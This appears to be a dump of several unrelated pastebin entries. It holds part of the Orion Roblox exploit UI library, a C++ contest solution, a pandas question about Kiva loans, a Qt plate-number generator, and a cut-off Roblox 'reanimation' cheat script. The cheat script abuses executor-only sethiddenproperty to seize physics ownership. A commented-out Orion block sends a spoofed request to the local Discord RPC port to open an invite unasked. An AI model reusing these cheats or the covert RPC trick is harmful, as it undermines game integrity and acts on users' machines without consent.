						TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
					end	
					TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
					TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					return DropdownConfig.Callback(Dropdown.Value)
				end

				AddConnection(Click.MouseButton1Click, function()
					Dropdown.Toggled = not Dropdown.Toggled
					DropdownFrame.F.Line.Visible = Dropdown.Toggled
					TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
					if #Dropdown.Options > MaxElements then
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
					else
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
					end
				end)

				Dropdown:Refresh(Dropdown.Options, false)
				Dropdown:Set(Dropdown.Value)
				if DropdownConfig.Flag then				
					OrionLib.Flags[DropdownConfig.Flag] = Dropdown
				end
				return Dropdown
			end
			function ElementFunction:AddBind(BindConfig)
				BindConfig.Name = BindConfig.Name or ""Bind""
				BindConfig.Default = BindConfig.Default or Enum.KeyCode.Unknown
				BindConfig.Hold = BindConfig.Hold or false
				BindConfig.Callback = BindConfig.Callback or function() end
				BindConfig.Flag = BindConfig.Flag or nil
				BindConfig.Save = BindConfig.Save or false

				local Bind = {Value, Binding = false, Type = ""Bind"", Save = BindConfig.Save}
				local Holding = false

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local BindBox = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -12, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					AddThemeObject(SetProps(MakeElement(""Label"", BindConfig.Name, 14), {
						Size = UDim2.new(1, 0, 1, 0),
						Font = Enum.Font.GothamBold,
						TextXAlignment = Enum.TextXAlignment.Center,
						Name = ""Value""
					}), ""Text"")
				}), ""Main"")

				local BindFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", BindConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					BindBox,
					Click
				}), ""Second"")

				AddConnection(BindBox.Value:GetPropertyChangedSignal(""Text""), function()
					--BindBox.Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)
					TweenService:Create(BindBox, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)}):Play()
				end)

				AddConnection(Click.InputEnded, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then
						if Bind.Binding then return end
						Bind.Binding = true
						BindBox.Value.Text = """"
					end
				end)

				AddConnection(UserInputService.InputBegan, function(Input)
					if UserInputService:GetFocusedTextBox() then return end
					if (Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value) and not Bind.Binding then
						if BindConfig.Hold then
							Holding = true
							BindConfig.Callback(Holding)
						else
							BindConfig.Callback()
						end
					elseif Bind.Binding then
						local Key
						pcall(function()
							if not CheckKey(BlacklistedKeys, Input.KeyCode) then
								Key = Input.KeyCode
							end
						end)
						pcall(function()
							if CheckKey(WhitelistedMouse, Input.UserInputType) and not Key then
								Key = Input.UserInputType
							end
						end)
						Key = Key or Bind.Value
						Bind:Set(Key)
						SaveCfg(game.GameId)
					end
				end)

				AddConnection(UserInputService.InputEnded, function(Input)
					if Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value then
						if BindConfig.Hold and Holding then
							Holding = false
							BindConfig.Callback(Holding)
						end
					end
				end)

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)

				function Bind:Set(Key)
					Bind.Binding = false
					Bind.Value = Key or Bind.Value
					Bind.Value = Bind.Value.Name or Bind.Value
					BindBox.Value.Text = Bind.Value
				end

				Bind:Set(BindConfig.Default)
				if BindConfig.Flag then				
					OrionLib.Flags[BindConfig.Flag] = Bind
				end
				return Bind
			end  
			function ElementFunction:AddTextbox(TextboxConfig)
				TextboxConfig = TextboxConfig or {}
				TextboxConfig.Name = TextboxConfig.Name or ""Textbox""
				TextboxConfig.Default = TextboxConfig.Default or """"
				TextboxConfig.TextDisappear = TextboxConfig.TextDisappear or false
				TextboxConfig.Callback = TextboxConfig.Callback or function() end

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local TextboxActual = AddThemeObject(Create(""TextBox"", {
					Size = UDim2.new(1, 0, 1, 0),
					BackgroundTransparency = 1,
					TextColor3 = Color3.fromRGB(255, 255, 255),
					PlaceholderColor3 = Color3.fromRGB(210,210,210),
					PlaceholderText = ""Input"",
					Font = Enum.Font.GothamSemibold,
					TextXAlignment = Enum.TextXAlignment.Center,
					TextSize = 14,
					ClearTextOnFocus = false
				}), ""Text"")

				local TextContainer = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -12, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					TextboxActual
				}), ""Main"")


				local TextboxFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement(""Label"", TextboxConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = ""Content""
					}), ""Text""),
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
					TextContainer,
					Click
				}), ""Second"")

				AddConnection(TextboxActual:GetPropertyChangedSignal(""Text""), function()
					--TextContainer.Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)
					TweenService:Create(TextContainer, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)}):Play()
				end)

				AddConnection(TextboxActual.FocusLost, function()
					TextboxConfig.Callback(TextboxActual.Text)
					if TextboxConfig.TextDisappear then
						TextboxActual.Text = """"
					end	
				end)

				TextboxActual.Text = TextboxConfig.Default

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
					TextboxActual:CaptureFocus()
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)
			end 
			function ElementFunction:AddColorpicker(ColorpickerConfig)
				ColorpickerConfig = ColorpickerConfig or {}
				ColorpickerConfig.Name = ColorpickerConfig.Name or ""Colorpicker""
				ColorpickerConfig.Default = ColorpickerConfig.Default or Color3.fromRGB(255,255,255)
				ColorpickerConfig.Callback = ColorpickerConfig.Callback or function() end
				ColorpickerConfig.Flag = ColorpickerConfig.Flag or nil
				ColorpickerConfig.Save = ColorpickerConfig.Save or false

				local ColorH, ColorS, ColorV = 1, 1, 1
				local Colorpicker = {Value = ColorpickerConfig.Default, Toggled = false, Type = ""Colorpicker"", Save = ColorpickerConfig.Save}

				local ColorSelection = Create(""ImageLabel"", {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(select(3, Color3.toHSV(Colorpicker.Value))),
					ScaleType = Enum.ScaleType.Fit,
					AnchorPoint = Vector2.new(0.5, 0.5),
					BackgroundTransparency = 1,
					Image = ""http://www.roblox.com/asset/?id=4805639000""
				})

				local HueSelection = Create(""ImageLabel"", {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(0.5, 0, 1 - select(1, Color3.toHSV(Colorpicker.Value))),
					ScaleType = Enum.ScaleType.Fit,
					AnchorPoint = Vector2.new(0.5, 0.5),
					BackgroundTransparency = 1,
					Image = ""http://www.roblox.com/asset/?id=4805639000""
				})

				local Color = Create(""ImageLabel"", {
					Size = UDim2.new(1, -25, 1, 0),
					Visible = false,
					Image = ""rbxassetid://4155801252""
				}, {
					Create(""UICorner"", {CornerRadius = UDim.new(0, 5)}),
					ColorSelection
				})

				local Hue = Create(""Frame"", {
					Size = UDim2.new(0, 20, 1, 0),
					Position = UDim2.new(1, -20, 0, 0),
					Visible = false
				}, {
					Create(""UIGradient"", {Rotation = 270, Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))},}),
					Create(""UICorner"", {CornerRadius = UDim.new(0, 5)}),
					HueSelection
				})

				local ColorpickerContainer = Create(""Frame"", {
					Position = UDim2.new(0, 0, 0, 32),
					Size = UDim2.new(1, 0, 1, -32),
					BackgroundTransparency = 1,
					ClipsDescendants = true
				}, {
					Hue,
					Color,
					Create(""UIPadding"", {
						PaddingLeft = UDim.new(0, 35),
						PaddingRight = UDim.new(0, 35),
						PaddingBottom = UDim.new(0, 10),
						PaddingTop = UDim.new(0, 17)
					})
				})

				local Click = SetProps(MakeElement(""Button""), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local ColorpickerBox = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -12, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(MakeElement(""Stroke""), ""Stroke"")
				}), ""Main"")

				local ColorpickerFrame = AddThemeObject(SetChildren(SetProps(MakeElement(""RoundFrame"", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					SetProps(SetChildren(MakeElement(""TFrame""), {
						AddThemeObject(SetProps(MakeElement(""Label"", ColorpickerConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = ""Content""
						}), ""Text""),
						ColorpickerBox,
						Click,
						AddThemeObject(SetProps(MakeElement(""Frame""), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = ""Line"",
							Visible = false
						}), ""Stroke""), 
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = ""F""
					}),
					ColorpickerContainer,
					AddThemeObject(MakeElement(""Stroke""), ""Stroke""),
				}), ""Second"")

				AddConnection(Click.MouseButton1Click, function()
					Colorpicker.Toggled = not Colorpicker.Toggled
					TweenService:Create(ColorpickerFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Colorpicker.Toggled and UDim2.new(1, 0, 0, 148) or UDim2.new(1, 0, 0, 38)}):Play()
					Color.Visible = Colorpicker.Toggled
					Hue.Visible = Colorpicker.Toggled
					ColorpickerFrame.F.Line.Visible = Colorpicker.Toggled
				end)

				local function UpdateColorPicker()
					ColorpickerBox.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
					Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)
					Colorpicker:Set(ColorpickerBox.BackgroundColor3)
					ColorpickerConfig.Callback(ColorpickerBox.BackgroundColor3)
					SaveCfg(game.GameId)
				end

				ColorH = 1 - (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
				ColorS = (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
				ColorV = 1 - (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)

				AddConnection(Color.InputBegan, function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						if ColorInput then
							ColorInput:Disconnect()
						end
						ColorInput = AddConnection(RunService.RenderStepped, function()
							local ColorX = (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
							local ColorY = (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
							ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
							ColorS = ColorX
							ColorV = 1 - ColorY
							UpdateColorPicker()
						end)
					end
				end)

				AddConnection(Color.InputEnded, function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						if ColorInput then
							ColorInput:Disconnect()
						end
					end
				end)

				AddConnection(Hue.InputBegan, function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						if HueInput then
							HueInput:Disconnect()
						end;

						HueInput = AddConnection(RunService.RenderStepped, function()
							local HueY = (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)

							HueSelection.Position = UDim2.new(0.5, 0, HueY, 0)
							ColorH = 1 - HueY

							UpdateColorPicker()
						end)
					end
				end)

				AddConnection(Hue.InputEnded, function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						if HueInput then
							HueInput:Disconnect()
						end
					end
				end)

				function Colorpicker:Set(Value)
					Colorpicker.Value = Value
					ColorpickerBox.BackgroundColor3 = Colorpicker.Value
					ColorpickerConfig.Callback(Colorpicker.Value)
				end

				Colorpicker:Set(Colorpicker.Value)
				if ColorpickerConfig.Flag then				
					OrionLib.Flags[ColorpickerConfig.Flag] = Colorpicker
				end
				return Colorpicker
			end  
			return ElementFunction   
		end	

		local ElementFunction = {}

		function ElementFunction:AddSection(SectionConfig)
			SectionConfig.Name = SectionConfig.Name or ""Section""

			local SectionFrame = SetChildren(SetProps(MakeElement(""TFrame""), {
				Size = UDim2.new(1, 0, 0, 26),
				Parent = Container
			}), {
				AddThemeObject(SetProps(MakeElement(""Label"", SectionConfig.Name, 14), {
					Size = UDim2.new(1, -12, 0, 16),
					Position = UDim2.new(0, 0, 0, 3),
					Font = Enum.Font.GothamSemibold
				}), ""TextDark""),
				SetChildren(SetProps(MakeElement(""TFrame""), {
					AnchorPoint = Vector2.new(0, 0),
					Size = UDim2.new(1, 0, 1, -24),
					Position = UDim2.new(0, 0, 0, 23),
					Name = ""Holder""
				}), {
					MakeElement(""List"", 0, 6)
				}),
			})

			AddConnection(SectionFrame.Holder.UIListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""), function()
				SectionFrame.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y + 31)
				SectionFrame.Holder.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y)
			end)

			local SectionFunction = {}
			for i, v in next, GetElements(SectionFrame.Holder) do
				SectionFunction[i] = v 
			end
			return SectionFunction
		end	

		for i, v in next, GetElements(Container) do
			ElementFunction[i] = v 
		end

		if TabConfig.PremiumOnly then
			for i, v in next, ElementFunction do
				ElementFunction[i] = function() end
			end    
			Container:FindFirstChild(""UIListLayout""):Destroy()
			Container:FindFirstChild(""UIPadding""):Destroy()
			SetChildren(SetProps(MakeElement(""TFrame""), {
				Size = UDim2.new(1, 0, 1, 0),
				Parent = ItemParent
			}), {
				AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://3610239960""), {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(0, 15, 0, 15),
					ImageTransparency = 0.4
				}), ""Text""),
				AddThemeObject(SetProps(MakeElement(""Label"", ""Unauthorised Access"", 14), {
					Size = UDim2.new(1, -38, 0, 14),
					Position = UDim2.new(0, 38, 0, 18),
					TextTransparency = 0.4
				}), ""Text""),
				AddThemeObject(SetProps(MakeElement(""Image"", ""rbxassetid://4483345875""), {
					Size = UDim2.new(0, 56, 0, 56),
					Position = UDim2.new(0, 84, 0, 110),
				}), ""Text""),
				AddThemeObject(SetProps(MakeElement(""Label"", ""Premium Features"", 14), {
					Size = UDim2.new(1, -150, 0, 14),
					Position = UDim2.new(0, 150, 0, 112),
					Font = Enum.Font.GothamBold
				}), ""Text""),
				AddThemeObject(SetProps(MakeElement(""Label"", ""This part of the script is locked to Sirius Premium users. Purchase Premium in the Discord server (discord.gg/sirius)"", 12), {
					Size = UDim2.new(1, -200, 0, 14),
					Position = UDim2.new(0, 150, 0, 138),
					TextWrapped = true,
					TextTransparency = 0.4
				}), ""Text"")
			})
		end
		return ElementFunction   
	end  
	
	--if writefile and isfile then
	--	if not isfile(""NewLibraryNotification1.txt"") then
	--		local http_req = (syn and syn.request) or (http and http.request) or http_request
	--		if http_req then
	--			http_req({
	--				Url = 'http://127.0.0.1:6463/rpc?v=1',
	--				Method = 'POST',
	--				Headers = {
	--					['Content-Type'] = 'application/json',
	--					Origin = 'https://discord.com'
	--				},
	--				Body = HttpService:JSONEncode({
	--					cmd = 'INVITE_BROWSER',
	--					nonce = HttpService:GenerateGUID(false),
	--					args = {code = 'sirius'}
	--				})
	--			})
	--		end
	--		OrionLib:MakeNotification({
	--			Name = ""UI Library Available"",
	--			Content = ""New UI Library Available - Joining Discord (#announcements)"",
	--			Time = 8
	--		})
	--		spawn(function()
	--			local UI = game:GetObjects(""rbxassetid://11403719739"")[1]

	--			if gethui then
	--				UI.Parent = gethui()
	--			elseif syn.protect_gui then
	--				syn.protect_gui(UI)
	--				UI.Parent = game.CoreGui
	--			else
	--				UI.Parent = game.CoreGui
	--			end

	--			wait(11)

	--			UI:Destroy()
	--		end)
	--		writefile(""NewLibraryNotification1.txt"",""The value for the notification having been sent to you."")
	--	end
	--end
	

	
	return TabFunction
end   

function OrionLib:Destroy()
	Orion:Destroy()
end

return OrionLib"
fiwc0GhC,Untitled,Josif_tepe,C++,Saturday 8th of July 2023 02:07:16 AM CDT,"#include <iostream>
#include <vector>
#include <cstring>
#include <fstream>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 10;
vector<int> graph[maxn];
const ll MOD = 1e9 + 7;
int painted[maxn];
ll dp[maxn][4];
void dfs(int node, int prev) {
    for(int i = 0; i < (int) graph[node].size(); i++) {
        int neighbour = graph[node][i];
        if(neighbour != prev) {
            dfs(neighbour, node);
        }
    }
    for(int current_color = 1; current_color <= 3; current_color++) {
        if(painted[node] != -1 and painted[node] != current_color) {
            continue;
        }
        
        dp[node][current_color] = 1;
        
        for(int i = 0; i < (int) graph[node].size(); i++) {
            int neighbour = graph[node][i];
            if(neighbour != prev) {
                ll sum = 0;
                for(int next_color = 1; next_color <= 3; next_color++) {
                    if(current_color != next_color) {
                        sum += dp[neighbour][next_color];
                    }
                }
                dp[node][current_color] *= sum;
                dp[node][current_color] %= MOD;
                
            }
        }
    }
}
int main(int argc, const char * argv[]) {
    ios_base::sync_with_stdio(false);
    ifstream cin(""barnpainting.in"");
    ofstream cout(""barnpainting.out"");
    int n, k;
    cin >> n >> k;
    
    for(int i = 0; i < n - 1; i++) {
        int a, b;
        cin >> a >> b;
        a--; b--;
        graph[a].push_back(b);
        graph[b].push_back(a);
    }
    memset(painted, -1, sizeof painted);
    for(int i = 0; i < k; i++) {
        int a, b;
        cin >> a >> b;
        a--;
        painted[a] = b;
    }
    dfs(0, -1);
    cout << (dp[0][1] + dp[0][2] + dp[0][3]) % MOD  << endl;
    return 0;
}
"
yrbfBYJU,не удается разбить время сбора одного доллара на категории,AnnaCh1971,Python,Saturday 8th of July 2023 01:54:08 AM CDT,"import pandas as pd

# библиотека для работы с датой и временем
from datetime import datetime, timedelta

# библиотека для расчета
import numpy as np
from numpy import median

import phik

# библиотеки для рисования графиков
import matplotlib.pyplot as plt
from matplotlib import rcParams

import seaborn as sns

import plotly.express as px 
from plotly import graph_objects as go 

df = pd.read_csv('kiva.zip',low_memory=False)
display(df['partner_id'].dtype)
df['partner_id'] = df['partner_id'].astype(str)
df['partner_id'].dtype

df['funded_time'] = pd.to_datetime(df['funded_time'])
df['posted_time'] = pd.to_datetime(df['posted_time'])

df['disbursed_time'] = pd.to_datetime(df['disbursed_time'])

df['time_funded'] = df['funded_time'] - df['posted_time']
df['hours_funded'] = df['time_funded'].dt.days*24 + df['time_funded'].dt.seconds / 3600

df['time_per_dollar'] = df['hours_funded']/df['funded_amount']
df['time_per_dollar'].dtype

# функция range_time_per_dollar должна разбивать на категории
def range_time_per_dollar (x):
    if x<1:
        return round(x*100)/100
    elif x<5:
        return round(x*20)/20
    elif x<20:
        return round(x*2)/2
    elif x<60:
        return round(x)
    else:
        return 80

# применяем функцию 
df['time_per_dollar'].apply(range_time_per_dollar)

# но количество уникальных значений остается 612 781
df['time_per_dollar'].nunique()"
3d9dyybs,Hungarian PlateNumber Generator v1 Cplusplus,angryatti,C++,Saturday 8th of July 2023 01:49:10 AM CDT,"#include ""platenumb.h""
#include ""./ui_platenumb.h""
#include <unordered_set>

PlateNumb::PlateNumb(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::PlateNumb)
{
    ui->setupUi(this);
    ui->GenPlateBT1->setVisible(false);

}

PlateNumb::~PlateNumb()
{
    delete ui;
}

std::unordered_set <QString> setPlate;

QString genPlate ="""";

void PlateNumb::on_GenPlateBT1_clicked()
{



    QString albet;
    char al2;
    genPlate="""";
    for (int ch = 'A'; ch <= 'Z'; ch++) {
        al2=(char)ch;
        albet+=al2;
    }



    for (int i=0;i<4;i++){
        int randTemp = rand() % albet.length();

        genPlate.append(albet[randTemp]);
    }

    genPlate.append(""-"") ;
    for (int i=0;i<3;i++){

        int randTemp = rand() % 10;
        genPlate.append(QString::number(randTemp));

}
    setPlate.insert(genPlate);


}

void PlateNumb::on_GenLotBT2_clicked()
{
  for (int i =0; i<100;i++){
        PlateNumb::on_GenPlateBT1_clicked();
  }
  for (auto i = setPlate.begin();i!=setPlate.end();i++)
  {
        ui->GennedPlateListLE1->append(*i);

  }

}
"
nBGiPmzY,fakechar hat dupe reanimation,Synpase_X,Lua,Saturday 8th of July 2023 01:03:58 AM CDT,"
sethiddenproperty(game.Players.LocalPlayer,""MaximumSimulationRadius"",math.huge)
sethiddenproperty(game.Players.LocalPlayer,""SimulationRadius"",1.0000000331814e+32)
 
for i,v in next, game:GetService(""Players"").LocalPlayer.Character:GetDescendants() do
if v:IsA(""BasePart"") then--and v.Name ~=""HumanoidRootPart"" then 
game:GetService(""RunService"").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,-25.05,0)
wait(0.5)
end)
end
end
 
local char = workspace[game.Players.LocalPlayer.Name]
char.Archivable = true
 
local fakechar = char:Clone()
fakechar.Name = 'clone'
fakechar.Parent = char
fakechar.Head.face.Transparency = 1
 
local connections = {}
 
function create(part, parent, p, r)
part.AccessoryWeld:Remove()
Instance.new(""Attachment"",part)
Instance.new(""AlignPosition"",part)
Instance.new(""AlignOrientation"",part)
Instance.new(""Attachment"",parent)
part.AlignPosition.Attachment0 = part.Attachment
part.AlignOrientation.Attachment0 = part.Attachment
part.AlignPosition.Attachment1 = parent.Attachment
part.AlignOrientation.Attachment1 = parent.Attachment
part.Attachment.Position = p
part.Attachment.Orientation = r
part.AlignPosition.MaxForce = 999999999
part.AlignPosition.MaxVelocity = math.huge
part.AlignPosition.ReactionForceEnabled = false
part.AlignPosition.Responsiveness = math.huge
part.AlignOrientation.Responsiveness = 200
part.AlignPosition.RigidityEnabled = false
part.AlignOrientation.MaxTorque = 999999999
end
 
local hats = {
Torso = char:FindFirstChild('Hat1').Handle,
Torso1 = char:FindFirstChild('Robloxclassicred').Handle,
LeftArm = char:FindFirstChild('Pink Hair').Handle,
RightArm = char:FindFirstChild('Pal Hair').Handle,
LeftLeg = char:FindFirstChild('Kate Hair').Handle,
RightLeg = char:FindFirstChild('LavanderHair').Handle
}
 
function rmesh(HatName)
for _,mesh in next, workspace[game.Players.LocalPlayer.Name][HatName]:GetDescendants() do
if mesh:IsA(""Mesh"") or mesh:IsA(""SpecialMesh"") then
mesh:Remove()
end
end
end
 
game:GetService('RunService').Heartbeat:connect(function()
    hats.Torso.Velocity = Vector3.new(30,0,0)
    hats.Torso1.Velocity = Vector3.new(30,0,0)
    hats.LeftArm.Velocity = Vector3.new(30,0,0)
    hats.RightArm.Velocity = Vector3.new(30,0,0)
    hats.LeftLeg.Velocity = Vector3.new(30,0,0)
    hats.RightLeg.Velocity = Vector3.new(30,0,0)
end)
 
table.insert(connections, game:GetService('RunService').Stepped:Connect(function()
fakechar.Torso.CanCollide = false
fakechar.Head.CanCollide = false
end))
 
 
create(hats.Torso, fakechar['Torso'], Vector3.new(.5,0,0), Vector3.new(90,0,0))
create(hats.Torso1, fakechar['Torso'], Vector3.new(-.5,0,0), Vector3.new(90,0,0))
create(hats.LeftArm, fakechar['Left Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightArm, fakechar['Right Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.LeftLeg, fakechar['Left Leg'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightLeg, fakechar['Right Leg'], Vector3.new(), Vector3.new(90,0,0))
 
rmesh('Hat1')
rmesh('Robloxclassicred')
rmesh('Pink Hair')
rmesh('Pal Hair')
rmesh('Kate Hair')
rmesh('LavanderHair')
 
local kill = false
 
